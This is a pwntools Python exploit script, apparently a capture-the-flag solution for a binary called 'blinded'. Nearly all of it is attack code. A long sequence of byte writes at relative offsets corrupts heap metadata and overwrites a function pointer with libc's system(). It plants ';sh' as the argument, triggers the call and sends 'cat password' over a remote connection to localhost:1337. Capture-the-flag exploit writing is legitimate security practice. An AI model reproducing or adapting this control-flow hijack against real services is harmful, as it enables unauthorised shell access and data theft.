#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './blinded')
libc = ELF(exe.libc.path) if exe.libc else None

payload = b''
def write_byte(size, i, byte):
    global payload
    assert 2 <= size <= 0x3e8
    assert isinstance(byte, int) and 0 <= byte <= 0xff
    payload += f"{size} {i} {struct.unpack('b', struct.pack('B', byte))[0]}".encode() + b'\n'

write_byte(0x28, 0, 0)
write_byte(0x18, -0x238, 0x10)
write_byte(0x38, 0, 0)
write_byte(0x18, -0x238+8, 0x80)
write_byte(0x18, 0x38, 0x20|1)
write_byte(0x18, -0x58, 0x90|1)
write_byte(0x18, -0xc8, 0xc0|1)
write_byte(0x18, -0x2c0+0xe, 7)
write_byte(0x18, -0x2aa-2, 7)
write_byte(0x38, 0, 0)
write_byte(0xf8, 0, 0)
write_byte(0x68, 0, 0)
write_byte(0x78, 0, 0)
write_byte(0x28, 0, 0)
write_byte(0x18, -0x264+4, 1)
write_byte(0x18, -0x2aa-2, 0)
write_byte(0x18, -0x2c0+0xe, 0)
write_byte(0x18, -0xc0, 0)
write_byte(0x318, -8, 0x30|1)
write_byte(0x28, 0xf0, 0xe0)
write_byte(0x28, 0xf8, 0xe0)
write_byte(0x18, 0x20, 0xe0)
write_byte(0x18, 0x28, 0xe0)
write_byte(0x88, 0, 0)
for i in range(8): write_byte(0x28, 0xe720+i, 0)
write_byte(0x28, 0xe5c0, 0x60)
write_byte(0x28, 0xa9c8+0, 0x00)
write_byte(0x28, 0xa9c8+1, 0x00)
write_byte(0x28, 0xa9c8+2, 0x00)
write_byte(0x28, 0xa9c8+3, 0x00)
write_byte(0x28, 0xa9c8+4, 0x12)
write_byte(0x28, 0xa9c8+5, 0x02)
write_byte(0x28, 0xa9c8+6, 0x00)
write_byte(0x28, 0xa9c8+7, 0x00)
for i in range(8): write_byte(0x28, 0xa9c8+8+i, (libc.sym['system'] >> (8*i)) & 0xff)
for i in range(16, 24): write_byte(0x28, 0xa9c8+i, 0)
for i in range(3): write_byte(0x18, 0xa70+i, (u64(b';sh'.ljust(8, b'\x00')) >> (8*i)) & 0xff)
payload += f"2 {'0'*0xfff + '1'} 0".encode() + b'\n'
payload += b'cat password'

io = remote('localhost', 1337)
b64_payload = base64.b64encode(payload)
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"length of payload: ", str(len(b64_payload)).encode())
io.sendafter(b"(base64 encoded): ", b64_payload)
io.interactive()
